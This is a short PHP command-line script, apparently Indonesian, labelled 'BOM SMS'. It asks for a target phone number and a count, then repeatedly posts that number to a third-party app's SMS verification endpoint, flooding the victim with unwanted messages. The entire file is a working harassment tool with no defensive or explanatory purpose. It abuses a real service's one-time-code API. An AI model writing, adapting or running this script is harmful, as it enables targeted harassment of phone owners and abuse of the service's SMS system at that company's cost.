<?php
echo "\n";
echo "\n";
echo "    BOM SMS BY RAF LII    \n";
echo "Nomor Target: ";
$nomor = trim(fgets(STDIN));
echo "Jumlah: ";
$jum = trim(fgets(STDIN));

echo "##########################\n";

for ($i = 0;$i <= $jum;$i++) {
    curl($nomor);
    echo "sukses bom no $nomor\n";
}

function curl($no){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://app.mycomma.net/api/common/request_sms_number");
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"nation_number":"62","user_phone":"'.$no.'"}');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

return curl_exec($ch);
curl_close($ch);
}
